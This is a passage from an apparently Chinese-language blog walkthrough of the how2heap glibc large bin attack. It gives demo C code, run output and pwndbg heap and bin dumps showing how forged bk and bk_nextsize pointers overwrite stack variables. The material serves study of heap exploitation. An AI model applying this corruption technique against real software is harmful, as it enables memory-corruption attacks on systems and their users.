we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span><br>    <span class="hljs-comment">//为了覆写栈上的值,我们将在stack_var1前将bk设位16bytes,并在stack_var2前将bk_nextsize设为32bytes</span><br>            <span class="hljs-string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span><br>            <span class="hljs-string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);<br><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<br><br>    <span class="hljs-comment">//------------------------------------</span><br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br> <br>    <span class="hljs-comment">//让我们再malloc一次,这样被释放的large chunk就被插入到large bin freelist了</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span><br>    <span class="hljs-comment">//在这期间,我们的目标已经被改写</span><br>            <span class="hljs-string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果-2"><a href="#运行结果-2" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs applescript">root@<span class="hljs-number">284662</span>b4a7a3:~/how2heap/glibc_2<span class="hljs-number">.25</span><span class="hljs-comment"># ./large_bin_attack</span><br>This <span class="hljs-built_in">file</span> demonstrates large bin attack <span class="hljs-keyword">by</span> writing a large unsigned long value <span class="hljs-keyword">into</span> stack<br>In practice, large bin attack <span class="hljs-keyword">is</span> generally prepared <span class="hljs-keyword">for</span> further attacks, such <span class="hljs-keyword">as</span> rewriting <span class="hljs-keyword">the</span> <span class="hljs-keyword">global</span> variable global_max_fast <span class="hljs-keyword">in</span> libc <span class="hljs-keyword">for</span> further fastbin attack<br><br>Let&#x27;s <span class="hljs-keyword">first</span> look <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> targets we want <span class="hljs-keyword">to</span> rewrite <span class="hljs-keyword">on</span> stack:<br>stack_var1 (<span class="hljs-number">0x7ffe64e357c0</span>): <span class="hljs-number">0</span><br>stack_var2 (<span class="hljs-number">0x7ffe64e357c8</span>): <span class="hljs-number">0</span><br><br>Now, we allocate <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> large chunk <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> heap <span class="hljs-keyword">at</span>: <span class="hljs-number">0x1d99000</span><br>And allocate another fastbin chunk <span class="hljs-keyword">in</span> order <span class="hljs-keyword">to</span> avoid consolidating <span class="hljs-keyword">the</span> next large chunk <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> large chunk during <span class="hljs-keyword">the</span> free()<br><br>Then, we allocate <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> large chunk <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> heap <span class="hljs-keyword">at</span>: <span class="hljs-number">0x1d99360</span><br>And allocate another fastbin chunk <span class="hljs-keyword">in</span> order <span class="hljs-keyword">to</span> avoid consolidating <span class="hljs-keyword">the</span> next large chunk <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> large chunk during <span class="hljs-keyword">the</span> free()<br><br>Finally, we allocate <span class="hljs-keyword">the</span> <span class="hljs-keyword">third</span> large chunk <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> heap <span class="hljs-keyword">at</span>: <span class="hljs-number">0x1d997a0</span><br>And allocate another fastbin chunk <span class="hljs-keyword">in</span> order <span class="hljs-keyword">to</span> avoid consolidating <span class="hljs-keyword">the</span> top chunk <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">third</span> large chunk during <span class="hljs-keyword">the</span> free()<br><br>We free <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">second</span> large chunks now <span class="hljs-keyword">and</span> they will be inserted <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> unsorted bin: [ <span class="hljs-number">0x1d99360</span> &lt;<span class="hljs-comment">--&gt; 0x1d99000 ]</span><br><br>Now, we allocate a chunk <span class="hljs-keyword">with</span> a size smaller than <span class="hljs-keyword">the</span> freed <span class="hljs-keyword">first</span> large chunk. This will move <span class="hljs-keyword">the</span> freed <span class="hljs-keyword">second</span> large chunk <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> large bin freelist, use parts <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> freed <span class="hljs-keyword">first</span> large chunk <span class="hljs-keyword">for</span> allocation, <span class="hljs-keyword">and</span> reinsert <span class="hljs-keyword">the</span> remaining <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> freed <span class="hljs-keyword">first</span> large chunk <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> unsorted bin: [ <span class="hljs-number">0x1d990a0</span> ]<br><br>Now, we free <span class="hljs-keyword">the</span> <span class="hljs-keyword">third</span> large chunk <span class="hljs-keyword">and</span> <span class="hljs-keyword">it</span> will be inserted <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> unsorted bin: [ <span class="hljs-number">0x1d997a0</span> &lt;<span class="hljs-comment">--&gt; 0x1d990a0 ]</span><br><br>Now emulating a vulnerability <span class="hljs-keyword">that</span> can overwrite <span class="hljs-keyword">the</span> freed <span class="hljs-keyword">second</span> large chunk&#x27;s <span class="hljs-string">&quot;size&quot;</span> <span class="hljs-keyword">as</span> well <span class="hljs-keyword">as</span> <span class="hljs-keyword">its</span> <span class="hljs-string">&quot;bk&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;bk_nextsize&quot;</span> pointers<br>Basically, we decrease <span class="hljs-keyword">the</span> size <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> freed <span class="hljs-keyword">second</span> large chunk <span class="hljs-keyword">to</span> force malloc <span class="hljs-keyword">to</span> insert <span class="hljs-keyword">the</span> freed <span class="hljs-keyword">third</span> large chunk <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> head <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> large bin freelist. To overwrite <span class="hljs-keyword">the</span> stack variables, we <span class="hljs-keyword">set</span> <span class="hljs-string">&quot;bk&quot;</span> <span class="hljs-keyword">to</span> <span class="hljs-number">16</span> bytes <span class="hljs-keyword">before</span> stack_var1 <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;bk_nextsize&quot;</span> <span class="hljs-keyword">to</span> <span class="hljs-number">32</span> bytes <span class="hljs-keyword">before</span> stack_var2<br><br>Let&#x27;s malloc again, so <span class="hljs-keyword">the</span> freed <span class="hljs-keyword">third</span> large chunk being inserted <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> large bin freelist. During this <span class="hljs-built_in">time</span>, targets should have already been rewritten:<br>stack_var1 (<span class="hljs-number">0x7ffe64e357c0</span>): <span class="hljs-number">0x1d997a0</span><br>stack_var2 (<span class="hljs-number">0x7ffe64e357c8</span>): <span class="hljs-number">0x1d997a0</span><br></code></pre></td></tr></table></figure><h2 id="关键代码调试-1"><a href="#关键代码调试-1" class="headerlink" title="关键代码调试"></a>关键代码调试</h2><p>这里我也下了几个断点</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">41</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>  <span class="hljs-number">42</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br>  <span class="hljs-number">43</span><br>► <span class="hljs-number">44</span>     <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);<br><br>  <span class="hljs-number">67</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>  <span class="hljs-number">68</span><br>► <span class="hljs-number">69</span>     <span class="hljs-built_in">free</span>(p1);<br><br>  <span class="hljs-number">69</span>     <span class="hljs-built_in">free</span>(p1);<br>► <span class="hljs-number">70</span>     <span class="hljs-built_in">free</span>(p2);<br><br>  <span class="hljs-number">70</span>     <span class="hljs-built_in">free</span>(p2);<br>► <span class="hljs-number">71</span>     <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span><br>  <span class="hljs-number">72</span>            <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)(p2 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p2[<span class="hljs-number">0</span>]));<br><br>  <span class="hljs-number">74</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>► <span class="hljs-number">75</span>     <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span><br><br>  <span class="hljs-number">80</span>     <span class="hljs-built_in">free</span>(p3);<br>► <span class="hljs-number">81</span>     <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span><br>  <span class="hljs-number">82</span>            <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)(p3 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p3[<span class="hljs-number">0</span>]));<br><br><br>  <span class="hljs-number">92</span>     p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<br>  <span class="hljs-number">93</span>     p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-number">94</span>     p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-number">95</span>     p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<br>  <span class="hljs-number">96</span>     p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<br>  <span class="hljs-number">97</span><br>  <span class="hljs-number">98</span>     <span class="hljs-comment">//------------------------------------</span><br>  <span class="hljs-number">99</span><br>► <span class="hljs-number">100</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br>  <span class="hljs-number">100</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>  <span class="hljs-number">101</span><br>► <span class="hljs-number">102</span>     <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span><br><br></code></pre></td></tr></table></figure><p>好了,运行一下康康,首先是栈上的两个变量</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; x/10gx &amp; stack_var1<br><span class="hljs-number">0x7fffffffe5c0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffe5d0</span>: <span class="hljs-number">0x0000000000400a30</span>      <span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffe5e0</span>: <span class="hljs-number">0x00007fffffffe6d0</span>      <span class="hljs-number">0x9310f5c464b47700</span><br><span class="hljs-number">0x7fffffffe5f0</span>: <span class="hljs-number">0x0000000000400a30</span>      <span class="hljs-number">0x00007ffff7a2d830</span><br><span class="hljs-number">0x7fffffffe600</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007fffffffe6d8</span><br></code></pre></td></tr></table></figure><p>之后程序继续运行,下面是所有我们分配的chunk</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">817</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603330</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">49</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603360</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603770</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">49</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x6037a0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603bb0</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">49</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603be0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">132129</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br>pwndbg&gt;<br></code></pre></td></tr></table></figure><p>这里我们继续吧,首先我们释放了P1,此时的bins</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x603000 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x603000<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure><p>然后我们释放了P2,此时的bins</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x603360 —▸ <span class="hljs-number">0</span>x603000 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x603360 /* &#x27;`<span class="hljs-number">3</span>`&#x27; */<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">pwndbg</span>&gt;<br></code></pre></td></tr></table></figure><p>可以看到我们释放的两个chunk都被放到了unsorted bin中,因此我们再申请一个小chunk,系统就会把我们的第二个free chunk丢到large bin中了</p><p>之后我们再康康我们现在unsorted bin中的chunk,这个chunk已经是被分割过的了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x6030a0 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x6030a0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">0x400</span>: <span class="hljs-number">0</span>x603360 —▸ <span class="hljs-number">0</span>x7ffff7dd1f68 (main_arena+<span class="hljs-number">1096</span>) ◂— <span class="hljs-number">0</span>x603360 /* &#x27;`<span class="hljs-number">3</span>`&#x27; */<br><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>x <span class="hljs-number">0</span>x603000<br><span class="hljs-attribute">0x603000</span>:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x00000000000000a1<br><span class="hljs-attribute">0x603010</span>:       <span class="hljs-number">0</span>x00007ffff7dd1e98      <span class="hljs-number">0</span>x00007ffff7dd1e98<br><span class="hljs-attribute">0x603020</span>:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x603030</span>:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x603040</span>:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0</span>x6030a0<br><span class="hljs-attribute">0x6030a0</span>:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000291<br><span class="hljs-attribute">0x6030b0</span>:       <span class="hljs-number">0</span>x00007ffff7dd1b78      <span class="hljs-number">0</span>x00007ffff7dd1b78<br><span class="hljs-attribute">0x6030c0</span>:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x6030d0</span>:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x6030e0</span>:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br></code></pre></td></tr></table></figure><p>然后我们再运行一下,这里已经free了p3</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x6037a0 —▸ <span class="hljs-number">0</span>x6030a0 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x6037a0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">0x400</span>: <span class="hljs-number">0</span>x603360 —▸ <span class="hljs-number">0</span>x7ffff7dd1f68 (main_arena+<span class="hljs-number">1096</span>) ◂— <span class="hljs-number">0</span>x603360 /* &#x27;`<span class="hljs-number">3</span>`&#x27; */<br></code></pre></td></tr></table></figure><p>p3也被放入了unsortedbin中,这里我们开始伪造p2</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603360</span><br><span class="hljs-number">0x603360</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x000000<span class="hljs-number">00000003f1</span><br><span class="hljs-number">0x603370</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00007fffffffe5b0<br><span class="hljs-number">0x603380</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00007fffffffe5a8<br><span class="hljs-number">0x603390</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6033a0</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>先修改了size为0x3f1,然后fd为0,fd-&gt;nextsize为0,bk为&amp;stack_var-2而bk_size为&amp;stack_var2-4,也就是指向了同一个地址:)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 